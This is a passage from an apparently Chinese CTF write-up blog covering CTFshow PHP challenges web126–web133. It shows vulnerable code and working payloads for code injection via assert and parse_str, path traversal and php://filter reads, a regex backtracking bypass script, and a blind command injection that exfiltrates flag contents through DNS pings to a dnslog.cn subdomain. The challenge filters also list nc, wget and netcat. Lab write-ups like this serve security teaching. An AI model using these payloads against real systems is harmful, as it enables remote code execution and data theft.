class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法一：<br>同web123方法二<br>get：?b&#x3D;1+fl0g&#x3D;flag_give_me<br>post：CTF[SHOW.COM&#x3D;1&amp;CTF_SHOW&#x3D;1&amp;fun&#x3D;parse_str($a[1])</p>
<p>这题比较狗血，他后面ban了几个单个字母，真的狗血，什么highlight,include,show,export全没了，真是个小天才</p>
<p>方法二：<br>post：CTF[SHOW.COM&#x3D;1&amp;CTF_SHOW&#x3D;1&amp;fun&#x3D;assert($a[1])<br>get：?b&#x3D;1+fl0g&#x3D;flag_give_me<br>assert函数没有给ban掉，assert和eval几乎一样：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662867102651-f224b633-c2fa-4310-8b2e-09a005d0056e.png#averageHue=%23e7e5e5&clientId=u037cf599-bb6a-4&from=paste&height=436&id=uad921f7d&name=image.png&originHeight=545&originWidth=1422&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91801&status=done&style=none&taskId=u9fe4a7c0-8624-4cc2-802f-760ce63aad7&title=&width=1137.6" alt="image.png"></p>
<h2 id="Web127（SERVER-‘QUERY-STRING’-）"><a href="#Web127（SERVER-‘QUERY-STRING’-）" class="headerlink" title="Web127（SERVER[‘QUERY_STRING’]）"></a>Web127（SERVER[‘QUERY_STRING’]）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>知识点就是之前说的关于变量名字的问题</p>
<ul>
<li>首先什么是<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>：</li>
</ul>
<p>和之前的<code>$_SERVER[&#39;argv&#39;]</code>基本一样，但是有点不同，都是储存get请求信息的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662874225311-3e6f2b7a-c2d8-4702-ae4d-0e3e9e90a02c.png#averageHue=%23f3f7e3&clientId=u037cf599-bb6a-4&from=paste&height=118&id=ucb672572&name=image.png&originHeight=148&originWidth=669&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10083&status=done&style=none&taskId=u4e363294-9c58-40be-b68b-265b82272f7&title=&width=535.2" alt="image.png"><br>可以看到也显示了请求信息，但是他的类型不是数组，而是一个字符串，所有用+分割不开，这是一个区别</p>
<ul>
<li>extract</li>
</ul>
<p>把数组元素注册成变量，这个很简单很熟悉</p>
<p>所以构造payload：?ctf%20show&#x3D;ilove36d<br>其中%20在GET数组中会被转化成下划线_，而空格在waf中没有被过滤，所以可以通过判断<br>最后储存在GET中是这样的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662874422940-539b68ea-348f-437f-80a9-de656b150fcc.png#averageHue=%23cec1a6&clientId=u037cf599-bb6a-4&from=paste&height=190&id=u25713d9d&name=image.png&originHeight=237&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12143&status=done&style=none&taskId=u309d124d-d952-4d6c-a6a0-0e147c4f2c2&title=&width=707.2" alt="image.png"><br>可以看到ctf_show被注册了，最后直接输出flag</p>
<h2 id="Web128-gettext拓展）"><a href="#Web128-gettext拓展）" class="headerlink" title="Web128(gettext拓展）"></a>Web128(gettext拓展）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>一个新的姿势，当php扩展目录下有php_gettext.dll时：<br><code>_()</code>是一个函数。<code>_()</code>就等于<code>gettext()</code></p>
<ul>
<li>gettext()有什么作用呢？<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="string">&#x27;helloworld&#x27;</span>)</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662879730935-0d087b46-658f-4a90-b4a2-5d65b076b1e7.png#averageHue=%23ebc791&clientId=u61d4c114-ca0a-4&from=paste&height=97&id=u3e882035&name=image.png&originHeight=121&originWidth=396&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5501&status=done&style=none&taskId=u47268675-2b09-4941-8be2-79769c0af93&title=&width=316.8" alt="image.png"><br>也就是将我们的输入的参数返回了<br>利用这一点构造payload：<br>?f1&#x3D;_&amp;f2&#x3D;get_defined_vars<br>分析一下首先是把f1，f2放进了<code>call_user_func</code>里，相当于gettext(get_defined_vars)<br>返回的也就是get_defined_vars<br>然后第二次调用call_user_func，等价于<code>get_defined_vars()</code><br><strong>call_user_func不设置第二个参数默认是空</strong><br>最后就等于运行了var_dump(get_defined_vars())，成功得出答案<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662880087091-f67cd803-f40f-420c-81bb-da69657cdeab.png#averageHue=%23e6c07d&clientId=u61d4c114-ca0a-4&from=paste&height=225&id=u7ed51d02&name=image.png&originHeight=281&originWidth=1777&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45248&status=done&style=none&taskId=ud97ba102-3d43-4e6b-b6e9-414c71b2181&title=&width=1421.6" alt="image.png"></li>
</ul>
<h2 id="Web129（目录穿越和伪协议）"><a href="#Web129（目录穿越和伪协议）" class="headerlink" title="Web129（目录穿越和伪协议）"></a>Web129（目录穿越和伪协议）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</li>
<li>返回值：返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。<strong>注释：</strong>字符串位置从 0 开始，不是从 1 开始。</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662882322709-05c32c8d-2289-4849-8ad3-50e10ca25c94.png#averageHue=%23fcfcfb&clientId=uababac66-ee31-4&from=paste&height=224&id=u6d65fe7c&name=image.png&originHeight=280&originWidth=1255&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10885&status=done&style=none&taskId=u7f1ac2f0-753b-417c-8c61-a6ad7c97251&title=&width=1004" alt="image.png"></p>
<ul>
<li>readfile：函数读取一个文件，并写入到输出缓冲。</li>
<li>返回值：文件字数</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662882378149-f402e66c-362a-41a5-8ef2-6ebd1dc43b47.png#averageHue=%23f6f5f2&clientId=uababac66-ee31-4&from=paste&height=175&id=uaab45f4e&name=image.png&originHeight=219&originWidth=663&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8408&status=done&style=none&taskId=u44d7e763-dd38-491c-ae80-2ddf7dffd38&title=&width=530.4" alt="image.png"><br>代码审计过后发现要让代码中有ctfshow这个字符串<br>payload1目录穿越：<br><code>?f=/ctfshow/../../../../var/www/html/flag.php</code>or<br><code>?f=./ctfshow/../flag.php</code><br>payload2伪协议：<br><code>?f=php://filter/ctfshow/resource=flag.php</code>然后访问源码<br>or<code>?f=php://filter/convert.base64-encode/ctfshow/resource=flag.php</code><br>or<code>?f=php://filter/convert.base64-encode|ctfshow/resource=flag.php</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662882751200-1de34644-8b02-4757-a6f0-ed496f8ed3f1.png#averageHue=%23b4b3b3&clientId=uababac66-ee31-4&from=paste&height=391&id=u823c482c&name=image.png&originHeight=489&originWidth=1722&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47694&status=done&style=none&taskId=ue47f228a-4530-4773-9a89-ae1c9744884&title=&width=1377.6" alt="image.png"><br>把结果解码一下就好了</p>
<h2 id="Web130（回溯次数超限，数组绕过）"><a href="#Web130（回溯次数超限，数组绕过）" class="headerlink" title="Web130（回溯次数超限，数组绕过）"></a>Web130（回溯次数超限，数组绕过）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>朴素的不能再朴素的一题，要理解正则的意思，<code>.+？</code>这三个字符使得必须要有一个字符在ctfshow前，不信？测试测试：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662885045539-fa0bf0d9-9ba2-4ab3-981d-77afa1ed30ba.png#averageHue=%23599f16&clientId=u15e950b6-79ed-4&from=paste&height=86&id=u1db48496&name=image.png&originHeight=108&originWidth=533&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6423&status=done&style=none&taskId=u21602407-9f81-487e-a8a4-bb4a71a35a0&title=&width=426.4" alt="image.png"><br>返回值是0，如果我们把+去掉会发生什么呢？：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662885107907-7d442757-4661-44bd-95dc-be53ce32be97.png#averageHue=%23c9e0ab&clientId=u15e950b6-79ed-4&from=paste&height=82&id=u544c1daa&name=image.png&originHeight=102&originWidth=521&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6223&status=done&style=none&taskId=ua8dafa63-4b8d-483a-a793-3b849d5215a&title=&width=416.8" alt="image.png"><br>因为？表示匹配0或者以上，咳咳不扯远了再回到最初的测试代码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662885142225-69798b6a-9b7b-4059-8325-236c29b21cac.png#averageHue=%23e3dcb1&clientId=u15e950b6-79ed-4&from=paste&height=81&id=u8a5c76ad&name=image.png&originHeight=101&originWidth=598&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6294&status=done&style=none&taskId=ud9ae9bf4-d792-4056-9134-09d303107cf&title=&width=478.4" alt="image.png"><br>这可以证实ctfshow前面要有字符<br>payload1：f&#x3D;ctfshow<br>因为他说不是false就可以。。。输入这个payload返回0<br>payload2：f[]&#x3D;ctfshow<br>和数组绕过有关，这时候stripos返回的是null也不是false<br>payload3：写个python脚本，题目开始提示我们说<code>very very very（省略25万个very）ctfshow</code><br>我们用python来加25w个very，来超过回溯次数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://f9ffa505-aff4-404d-9056-2ad5b92e8e47.challenge.ctf.show/&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;very&#x27;</span> * <span class="number">25000</span> + <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url, data=data).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>
<p>结果为：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662885260936-38696144-ddc3-41d7-a897-0c374276b96b.png#averageHue=%23302e2d&clientId=u15e950b6-79ed-4&from=paste&height=134&id=u02f8b77b&name=image.png&originHeight=168&originWidth=793&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25627&status=done&style=none&taskId=u35c987c0-d332-4d28-98cd-2c33fa04b28&title=&width=634.4" alt="image.png"><br>simple！！！</p>
<h2 id="web131（回溯次数超限）"><a href="#web131（回溯次数超限）" class="headerlink" title="web131（回溯次数超限）"></a>web131（回溯次数超限）</h2><p>使用web130中的python脚本超过回溯次数获得flag<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662948269504-4500ed41-caa9-4a9e-8169-5f5f98220d7a.png#averageHue=%232e2d2d&clientId=ue51b0349-1daf-4&from=paste&height=145&id=uaca3f545&name=image.png&originHeight=181&originWidth=701&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20300&status=done&style=none&taskId=u85d4685a-a612-422a-b63f-cd4c7038d22&title=&width=560.8" alt="image.png"></p>
<h2 id="Web132（逻辑预算符的优先级）"><a href="#Web132（逻辑预算符的优先级）" class="headerlink" title="Web132（逻辑预算符的优先级）"></a>Web132（逻辑预算符的优先级）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662950674796-74dc4c7e-8186-4a12-a34b-5119a6dcd9e4.png#averageHue=%23f7f6f5&clientId=ue51b0349-1daf-4&from=paste&height=626&id=u194e83e7&name=image.png&originHeight=783&originWidth=1896&originalType=binary&ratio=1&rotation=0&showTitle=false&size=341419&status=done&style=none&taskId=u7c8a4e96-d05c-4005-aca3-5939db3327e&title=&width=1516.8" alt="image.png"><br>进来看到个byd界面，用dirsearch扫一下发现了个&#x2F;admin目录，访问就得到了源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mt_rand:<br>知识点就是逻辑预算符的优先级<br>&amp;&amp;比||的优先级要高：<br>参考<br>所所以第二层if里面先运算<code>$code === mt_rand(1,0x36D) &amp;&amp; $password === $flag </code>这个值是真还是假无所谓，只要<code>$username ===&quot;admin&quot;</code>成立整个就为1</p>
<p>所以payload：?username&#x3D;admin&amp;code&#x3D;admin&amp;password&#x3D;1<br>得出flag</p>
<h2 id="Web133（shell中curl和ping的利用）"><a href="#Web133（shell中curl和ping的利用）" class="headerlink" title="Web133（shell中curl和ping的利用）"></a>Web133（shell中curl和ping的利用）</h2><p>比较骚的一道题。。。利用了一些命令行指令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>寥寥几行代码透露着大大的无奈，题目只让我们用6个字符<br>这里就要有点套娃的去解题了，首先：<br>假如我们输入:<code>F=</code>$F <code>;sleep 3</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">经过<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>)截取后 得到  `<span class="variable">$F</span> `;</span><br><span class="line">也就是会执行 <span class="keyword">eval</span>(<span class="string">&quot;`<span class="subst">$F</span> `;&quot;</span>);</span><br><span class="line">我们把原来的<span class="variable">$F</span>带进去</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``<span class="subst">$F</span> `;sleep 3`&quot;</span>);</span><br><span class="line">也就是说最终会执行  `   `<span class="variable">$F</span> `;sleep <span class="number">3</span>  ` == <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;`<span class="subst">$F</span> `;sleep 3&quot;</span>);</span><br><span class="line">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br><span class="line">这样就在服务器上成功执行了 sleep <span class="number">3</span></span><br><span class="line">所以 最后就是一道无回显的RCE题目了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中反引号<code> </code>，在php中就等价于shell_exec，表示通过shell环境执行命令，<strong>但是不会有回显，</strong>也就是一到无回显RCE</p>
<ul>
<li>解法一：</li>
</ul>
<p>首先讲一个比较骚的姿势，就是把内容带出来：<br>payload：<br>首先在DNSLOG上获得一个三级域名：<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662961028740-43c14d6d-56ad-4ca6-bb19-c1c07f8df3f6.png#averageHue=%23fbfbfa&clientId=u02f1bbe1-f930-4&from=paste&height=258&id=ud2d462e2&name=image.png&originHeight=323&originWidth=1029&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15881&status=done&style=none&taskId=ud156ff6e-bf07-47dd-803c-a22472d9a9f&title=&width=823.2" alt="image.png"><br>get传参：<code>?F=</code>$F<code>;ping</code>cat fla* | grep ctfshow<code>.ennvj2.dnslog.cn</code><br>这里要用grep过滤一下，因为三级域名不能太长<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662961108732-64d8fc9c-c671-4a7a-8b51-52f1aa80c199.png#averageHue=%23fbfafa&clientId=u02f1bbe1-f930-4&from=paste&height=311&id=u752ac422&name=image.png&originHeight=389&originWidth=1256&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25131&status=done&style=none&taskId=ua15aa93a-628c-4f86-8b73-25db4f35592&title=&width=1004.8" alt="image.png"><br>之后点击刷新历史就可以看到我们的内容被带了出来<br>因为解析dns之前先会把我们的命令执行了，再把内容解析出来</p>
<ul>
<li>解法二：</li>
</ul>
